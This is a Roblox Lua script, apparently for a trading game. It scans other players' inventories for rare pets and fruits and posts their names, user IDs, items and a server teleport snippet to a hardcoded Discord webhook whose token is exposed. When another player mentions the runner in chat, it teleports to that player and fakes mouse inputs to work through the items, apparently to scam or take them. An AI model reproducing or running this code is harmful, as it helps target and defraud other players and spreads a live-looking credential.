-- Services
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local Camera = workspace.CurrentCamera
local VirtualInputManager = game:GetService("VirtualInputManager")
local TeleportService = game:GetService("TeleportService")

-- Configuration
local WEBHOOK_URL = "https://discord.com/api/webhooks/1393445006299234449/s32t5PInI1pwZmxL8VTTmdohJ637DT_i6ni1KH757iQwNpxfbGcBamIzVSWWfn0jP8Rg"
local RARE_PETS = {"T-Rex", "Dragonfly", "Raccoon", "Mimic Octopus", "Butterfly", "Disco bee", "Queen bee"}

-- Item patterns
local FRUIT_PATTERN = "%[(.-)%]%s(.+)%s%[(%d+%.%d+)kg%]"
local PET_PATTERN = "(.+)%s%[(%d+%.%d+)%sKG%]%s%[Age%s(%d+)%]"

-- Inventory scanner with priority sorting
local function scanInventory(player)
    local fruits = {}
    local pets = {}
    local rarePets = {}
    
    for _, item in pairs(player.Backpack:GetChildren()) do
        local name = item.Name
        
        -- Parse fruits
        local fruitTraits, fruitName, fruitWeight = name:match(FRUIT_PATTERN)
        if fruitName then
            local traitCount = select(2, fruitTraits:gsub(",", "")) + 1
            table.insert(fruits, {
                name = name,
                item = item,
                traits = fruitTraits,
                traitCount = traitCount,
                weight = tonumber(fruitWeight)
            })
        
        -- Parse pets
        else
            local petName, petWeight, petAge = name:match(PET_PATTERN)
            if petName then
                local isRare = false
                for _, rarePet in pairs(RARE_PETS) do
                    if petName:find(rarePet) then
                        isRare = true
                        break
                    end
                end
                
                local petData = {
                    name = name,
                    item = item,
                    weight = tonumber(petWeight),
                    age = tonumber(petAge),
                    isRare = isRare
                }
                
                table.insert(pets, petData)
                if isRare then
                    table.insert(rarePets, petData)
                end
            end
        end
    end
    
    -- Sort pets by priority (rare > weight > age)
    table.sort(pets, function(a, b)
        if a.isRare ~= b.isRare then
            return a.isRare
        elseif a.weight ~= b.weight then
            return a.weight > b.weight
        else
            return a.age > b.age
        end
    end)
    
    -- Sort fruits by priority (trait count > weight)
    table.sort(fruits, function(a, b)
        if a.traitCount ~= b.traitCount then
            return a.traitCount > b.traitCount
        else
            return a.weight > b.weight
        end
    end)
    
    return fruits, pets, rarePets
end

-- Webhook with teleport script
local function sendJoinNotification(player, fruits, pets, rarePets)
    local placeId = game.PlaceId
    local jobId = game.JobId
    
    local description = #rarePets > 0 and "🚨 RARE PETS DETECTED!" or "Player joined the game"
    local color = #rarePets > 0 and 0xFF0000 or 0x00FF00
    
    local fields = {
        {
            name = "🔗 Join Script", 
            value = string.format('```lua\ngame:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s")\n```', placeId, jobId),
            inline = false
        }
    }
    
    -- Add pets section
    if #pets > 0 then
        local petList = {}
        for _, pet in pairs(pets) do
            table.insert(petList, pet.name .. (pet.isRare and " ★" or ""))
        end
        table.insert(fields, {
            name = "🐾 Pets ("..#pets..")",
            value = "```"..table.concat(petList, "\n").."```",
            inline = true
        })
    end
    
    -- Add fruits section
    if #fruits > 0 then
        local fruitList = {}
        for _, fruit in pairs(fruits) do
            table.insert(fruitList, fruit.name)
        end
        table.insert(fields, {
            name = "🍇 Fruits ("..#fruits..")",
            value = "```"..table.concat(fruitList, "\n").."```",
            inline = true
        })
    end
    
    local embed = {
        title = "👤 "..player.Name.." joined",
        description = description,
        color = color,
        fields = fields,
        footer = {
            text = "Player ID: "..player.UserId
        }
    }
    
    local content = #rarePets > 0 and "@everyone" or nil
    pcall(function()
        if request then
            request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({content = content, embeds = {embed}})
            })
        else
            HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode({content = content, embeds = {embed}}))
        end
    end)
end

-- Interaction system
local function interactWithPlayer(targetPlayer)
    local targetChar = targetPlayer.Character or targetPlayer.CharacterAdded:Wait()
    local myChar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    
    -- Max zoom out
    LocalPlayer.CameraMaxZoomDistance = math.huge
    LocalPlayer.CameraMinZoomDistance = math.huge
    LocalPlayer.CameraMode = Enum.CameraMode.Classic
    
    -- Position in front
    local humanoid = myChar:FindFirstChildOfClass("Humanoid")
    if humanoid then
        humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
        myChar:SetPrimaryPartCFrame(targetChar:GetPrimaryPartCFrame() * CFrame.new(0, 0, -3))
    end
    
    -- Get inventory with priority sorting
    local fruits, pets = scanInventory(targetPlayer)
    
    -- Process pets first
    for _, pet in pairs(pets) do
        -- Equip the pet
        humanoid:EquipTool(pet.item)
        task.wait(0.5)
        
        -- Center screen click and hold
        local viewport = Camera.ViewportSize
        local center = Vector2.new(viewport.X/2, viewport.Y/2)
        
        VirtualInputManager:SendMouseButtonEvent(center.X, center.Y, 0, true, game, 1)
        task.wait(5) -- Hold for 5 seconds
        VirtualInputManager:SendMouseButtonEvent(center.X, center.Y, 0, false, game, 1)
        
        task.wait(1) -- Cooldown
    end
    
    -- Then process fruits if no pets left
    if #pets == 0 then
        for _, fruit in pairs(fruits) do
            -- Equip the fruit
            humanoid:EquipTool(fruit.item)
            task.wait(0.5)
            
            -- Center screen click and hold
            local viewport = Camera.ViewportSize
            local center = Vector2.new(viewport.X/2, viewport.Y/2)
            
            VirtualInputManager:SendMouseButtonEvent(center.X, center.Y, 0, true, game, 1)
            task.wait(5) -- Hold for 5 seconds
            VirtualInputManager:SendMouseButtonEvent(center.X, center.Y, 0, false, game, 1)
            
            task.wait(1) -- Cooldown
        end
    end
end

-- Chat handler
local function onPlayerChatted(player, message)
    if player == LocalPlayer then return end
    
    -- Check for mentions
    local lowerMsg = message:lower()
    if not (lowerMsg:find("@"..LocalPlayer.Name:lower()) or
             lowerMsg:find("@everyone") or
             lowerMsg:find("@here")) then
        return
    end
    
    -- Interact with player
    interactWithPlayer(player)
end

-- Player join handler
local function onPlayerJoined(player)
    if player == LocalPlayer then return end
    
    -- Wait for character and backpack to load
    local char = player.Character or player.CharacterAdded:Wait()
    player.Backpack:WaitForChild("ChildAdded", 10)
    
    -- Scan inventory
    local fruits, pets, rarePets = scanInventory(player)
    
    -- Send join notification
    sendJoinNotification(player, fruits, pets, rarePets)
    
    -- Setup chat listener
    player.Chatted:Connect(function(msg)
        onPlayerChatted(player, msg)
    end)
end

-- Initialize
for _, player in pairs(Players:GetPlayers()) do
    task.spawn(onPlayerJoined, player)
end

Players.PlayerAdded:Connect(onPlayerJoined)

print("✅ Advanced Item Scanner Active!")
